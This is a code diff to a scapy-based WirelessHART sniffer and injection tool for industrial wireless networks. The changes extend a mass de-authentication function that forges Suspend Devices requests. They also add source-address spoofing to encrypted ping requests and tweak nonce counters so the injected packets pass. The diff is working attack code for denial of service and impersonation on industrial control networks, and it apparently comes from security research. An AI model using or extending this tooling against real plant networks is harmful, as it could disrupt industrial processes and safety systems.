@@ -152,6 +152,7 @@ class Sniffer(WirelessHart, EventsManager):
         :return: received packet
         :rtype: :class:`scapy.packet.Packet`
         """
+        #print("pkt")
         global first_adv
         if WirelessHart_Network_Security_SubLayer_Hdr in packet and self.__configuration.decrypt:
             self.__asn = (self.__asn & (0xffffff0000)) | (packet.asn_snippet%256) | packet.seqnum
@@ -175,11 +176,11 @@ class Sniffer(WirelessHart, EventsManager):
                             self.superframes.delete_link"""
                     if WirelessHart_Add_Link_Request in cmd:
                         c = cmd[WirelessHart_Add_Link_Request]
-                        print(f"add link request src = {packet.dest_addr}, neighbor = {c.neighbor_nickname}")
+                        print(f"add link request src = {packet.nwk_dest_addr}, neighbor = {c.neighbor_nickname}")
                         self.superframes.create_and_add_link(c.superframe_id, 
                                                   c.slot_number,
                                                   c.channel_offset, 
-                                                  packet.dest_addr,
+                                                  packet.nwk_dest_addr,
                                                   c.neighbor_nickname,
                                                   Link.OPTIONS_TRANSMIT if c.transmit else Link.OPTIONS_RECEIVE if c.receive else Link.OPTIONS_SHARED, 
                                                   c.link_type)
@@ -244,7 +245,7 @@ class Sniffer(WirelessHart, EventsManager):
     def print_decryptor(self):
         print(self.__decryptor)
         
-    def mass_de_authetication_packet(self, dst, duration, wait_beofre_suspend:int=1000, src:int=0x1):
+    def mass_de_authetication_packet(self, dst, duration, wait_beofre_suspend:int=1000, graph = 0x1, src:int=0x1):
         """
         Sends a WirelessHart_Suspend_Devices_Request on the next slot in the next superframe"""
         
@@ -315,17 +316,17 @@ class Sniffer(WirelessHart, EventsManager):
                 first_src_route_segment = 1,
                 ttl = 0,
                 asn_snippet = (asn_to_send%0xffff) - 1,
-                graph_id = 0x1,
+                graph_id = graph,
                 nwk_dest_addr = 0xffff,
                 nwk_src_addr = 0xf980,
                 first_route_segment = [0x1, dst, 0xffff, 0xffff]
             )
             
             #prepare security sublayer
-            peer.incremenet_nonce()
+            #peer.incremenet_nonce()
             security_sub_layer = WirelessHart_Network_Security_SubLayer_Hdr(
                 security_types=0,
-                counter=peer.get_nonce_counter()%256,
+                counter=(peer.get_nonce_counter()+1)%256,
                 nwk_mic = 0
             )
             
@@ -386,19 +387,18 @@ class Sniffer(WirelessHart, EventsManager):
             return final_packet
         
         raise MissingEncryptionKey(dst)
-    def ping_response(self, src, dst_dl, hops=1):
-      """Prepare ping response"""
-      ans = self.superframes.get_link(dst, src, Link.TYPE_BROADCAST)
+    def ping_response(self, src, dst_dl, hops=1):   
+        """prepare ping response"""
+        ans = self.superframes.get_link(dst_dl, src, Link.TYPE_BROADCAST)
        
-      (sf, link) = ans
+        (sf, link) = ans
        
-      asn_to_send = (((self.__asn + 1000) // superframe.nb_slots) + 1) * superframe.nb_slots + link.join_slot
-      
-      ping_response = WirelessHart_Vendor_Specific_Dust_Networks_Ping_Response(
-          status=0,
+        asn_to_send = (((self.__asn + 1000) // sf.nb_slots) + 1) * sf.nb_slots + link.join_slot
+        ping_response = WirelessHart_Vendor_Specific_Dust_Networks_Ping_Response(
+        status=0,
             expanded_device_type= 0xe0a2,
             hops = hops,
-            temperature = 01,
+            temperature = 1,
             voltage = 2700
         )
         response = WirelessHart_Command_Response_Hdr(
@@ -513,17 +513,17 @@ class Sniffer(WirelessHart, EventsManager):
        
         raise MissingEncryptionKey(dst)
     
-    def ping_request(self, dst):
+    def ping_request(self, dst, spoofed_src=0x1):
         """Looks for the link corresponding to the communication between src and dst and sends a ping request"""
-        ans = self.superframes.get_link(dst, 0x1, Link.TYPE_BROADCAST)
+        ans = self.superframes.get_link(dst, 0xffff, Link.TYPE_BROADCAST)
         
         if ans :
             (sf, link) = ans
-            return self.ping_request_on_link(dst, sf, link)
+            return self.ping_request_on_link(dst, sf, link, spoofed_src=spoofed_src)
         #no link found raise error
-        raise MissingLink("0x1", hex(dst), "TYPE_BROADCAST")
+        raise MissingLink(spoofed_src, hex(dst), "TYPE_BROADCAST")
 
-    def ping_request_on_link(self, dst, superframe:Superframe, link: Link):
+    def ping_request_on_link(self, dst, superframe:Superframe, link: Link, spoofed_src=0x1):
         """Prepare and encrypt ping request paquet and sends on the given link"""
         
         #calculate asn to send : next slot of the link communication in the next superframe
@@ -583,13 +583,13 @@ class Sniffer(WirelessHart, EventsManager):
                 graph_id = 0x1,
                 nwk_dest_addr = dst,
                 nwk_src_addr = 0xf980,
-                first_route_segment = [0x1, dst, 0xffff, 0xffff]
+                first_route_segment = [spoofed_src, dst, 0xffff, 0xffff]
             )
             
-            peer.incremenet_nonce()
+            #peer.incremenet_nonce()
             security_sub_layer = WirelessHart_Network_Security_SubLayer_Hdr(
                 security_types=0,
-                counter=peer.get_nonce_counter()%256,
+                counter=(peer.get_nonce_counter()+1)%256,
                 nwk_mic = 0
             )
             
@@ -604,7 +604,7 @@ class Sniffer(WirelessHart, EventsManager):
             dot15d4_data = Dot15d4Data(
                 dest_panid = self.__panid,
                 dest_addr = dst,
-                src_addr = 0x1
+                src_addr = spoofed_src
             )
             dot15d4_fcs = Dot15d4FCS(
                 fcf_panidcompress = True,
